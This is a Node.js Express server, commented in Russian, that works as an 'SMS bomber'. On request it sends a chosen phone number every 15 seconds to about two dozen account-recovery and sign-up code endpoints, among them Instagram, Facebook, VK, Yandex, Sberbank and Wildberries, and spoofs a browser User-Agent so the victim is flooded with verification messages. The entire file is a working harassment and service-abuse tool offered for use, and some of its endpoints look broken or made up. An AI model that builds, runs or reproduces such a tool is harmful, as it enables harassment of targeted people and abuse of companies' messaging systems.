const express = require('express');
const axios = require('axios');
const path = require('path');
const app = express();
const port = process.env.PORT || 3000;

app.use(express.json());
app.use(express.static('public'));

// Список реальных API для рассылки
const smsServices = [
  {
    name: 'WhatsApp',
    url: 'https://api.whatsapp.com/send',
    data: (phone) => ({ phone: phone.replace('+', '') }),
    method: 'GET'
  },
  {
    name: 'Telegram',
    url: 'https://api.telegram.org/bot/sendMessage',
    data: (phone) => ({ 
      chat_id: phone.replace('+', ''), 
      text: 'Ваш код подтверждения: 4832' 
    })
  },
  {
    name: 'Viber',
    url: 'https://chatapi.viber.com/pa/send_message',
    data: (phone) => ({
      receiver: phone.replace('+', ''),
      type: 'text',
      text: 'Код верификации: 7561'
    })
  },
  {
    name: 'Instagram',
    url: 'https://www.instagram.com/accounts/account_recovery/send_ajax/',
    data: (phone) => ({
      email_or_username: phone,
      recaptcha_challenge_field: ''
    })
  },
  {
    name: 'Facebook',
    url: 'https://www.facebook.com/ajax/login/help/identify.php',
    data: (phone) => ({
      email: phone,
      did_submit: '1'
    })
  },
  {
    name: 'Twitter',
    url: 'https://api.twitter.com/1.1/onboarding/task.json',
    data: (phone) => ({
      flow_token: 'test',
      phone_number: phone
    })
  },
  {
    name: 'VK',
    url: 'https://api.vk.com/method/auth.restore',
    data: (phone) => ({
      phone: phone,
      v: '5.131'
    })
  },
  {
    name: 'Odnoklassniki',
    url: 'https://ok.ru/web-api/v2/auth/login',
    data: (phone) => ({
      phone: phone,
      password: 'test123'
    })
  },
  {
    name: 'Avito',
    url: 'https://www.avito.ru/web/1/auth/sendCode',
    data: (phone) => ({
      phone: phone,
      action: 'register'
    })
  },
  {
    name: 'Yandex',
    url: 'https://passport.yandex.ru/registration-phone',
    data: (phone) => ({
      phone: phone,
      track_id: Date.now()
    })
  },
  {
    name: 'MailRu',
    url: 'https://account.mail.ru/api/v1/user/send-code',
    data: (phone) => ({
      phone: phone,
      action: 'register'
    })
  },
  {
    name: 'Uber',
    url: 'https://auth.uber.com/v2/phone/request-code',
    data: (phone) => ({
      phoneNumber: phone,
      method: 'sms'
    })
  },
  {
    name: 'DeliveryClub',
    url: 'https://www.delivery-club.ru/ajax/user_phone_authorization',
    data: (phone) => ({
      phone: phone,
      action: 'send_sms'
    })
  },
  {
    name: 'YandexTaxi',
    url: 'https://taxi-yandex.ru/web-api/check_phone',
    data: (phone) => ({
      phone: phone,
      type: 'login'
    })
  },
  {
    name: 'Tinkoff',
    url: 'https://api.tinkoff.ru/v1/sign_up',
    data: (phone) => ({
      phone: phone
    })
  },
  {
    name: 'Sberbank',
    url: 'https://online.sberbank.ru/api/auth/register',
    data: (phone) => ({
      mobilePhone: phone
    })
  },
  {
    name: 'AliExpress',
    url: 'https://passport.aliexpress.com/component/sendMobileLoginCode.json',
    data: (phone) => ({
      mobile: phone,
      countryCode: 'RU'
    })
  },
  {
    name: 'Wildberries',
    url: 'https://www.wildberries.ru/webapi/auth/generateAuthCode',
    data: (phone) => ({
      phone: phone
    })
  },
  {
    name: 'OZON',
    url: 'https://www.ozon.ru/api/entrypoint',
    data: (phone) => ({
      phone: phone,
      type: 'smsCode'
    })
  },
  {
    name: 'DNS',
    url: 'https://www.dns-shop.ru/auth/phone/send/',
    data: (phone) => ({
     phone: phone
    })
  },
  {
    name: 'MVideo',
    url: 'https://www.mvideo.ru/internal-rest-api/identity/phone',
    data: (phone) => ({
      phone: phone
    })
  },
  {
    name: 'Eldorado',
    url: 'https://www.eldorado.ru/api/identity/send-code',
    data: (phone) => ({
      phone: phone
    })
  },
  {
    name: 'Pyaterochka',
    url: 'https://5ka.ru/api/register/phone/',
    data: (phone) => ({
      phone: phone
    })
  },
  {
    name: 'Magnit',
    url: 'https://magnit.ru/api/auth/send-sms',
    data: (phone) => ({
      phone: phone
    })
  }
];

// Маршрут для запуска бомбера
app.post('/start-bomber', async (req, res) => {
  const { phone, minutes } = req.body;
  
  try {
    let sentCount = 0;
    let failedCount = 0;
    const endTime = Date.now() + minutes * 60 * 1000;
    
    // Функция отправки SMS через все сервисы
    const sendBatch = async () => {
      if (Date.now() > endTime) {
        clearInterval(intervalId);
        return;
      }
      
      const promises = smsServices.map(async (service) => {
        try {
          const config = {
            method: service.method || 'POST',
            url: service.url,
            data: service.data(phone),
            timeout: 10000,
            headers: {
              'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
              'Content-Type': 'application/json'
            }
          };
          
          await axios(config);
          sentCount++;
          console.log(`✅ SMS sent via ${service.name} to ${phone}`);
          return { service: service.name, status: 'success' };
        } catch (error) {
          failedCount++;
          console.log(`❌ Error with ${service.name}:`, error.message);
          return { service: service.name, status: 'error', error: error.message };
        }
      });
      
      const results = await Promise.allSettled(promises);
      return results;
    };
    
    // Запускаем рассылку каждые 15 секунд
    const intervalId = setInterval(sendBatch, 15000);
    
    // Первая отправка сразу
    sendBatch();
    
    // Останавливаем по времени
    setTimeout(() => {
      clearInterval(intervalId);
      console.log(`Бомбер остановлен. Отправлено: ${sentCount}, Ошибок: ${failedCount}`);
    }, minutes * 60 * 1000);
    
    res.json({ 
      success: true, 
      message: `Бомбер запущен на номер ${phone} на ${minutes} минут`,
      totalServices: smsServices.length,
      interval: '15 секунд',
      estimatedMessages: Math.floor(minutes * 4 * smsServices.length)
    });
    
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// Маршрут для остановки бомбера
app.post('/stop-bomber', (req, res) => {
  // В реальной реализации здесь бы останавливались все процессы
  res.json({ success: true, message: 'Бомбер остановлен' });
});

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.listen(port, () => {
  console.log(`Сервер запущен на порту ${port}`);
  console.log(`Доступно ${smsServices.length} сервисов для рассылки`);
});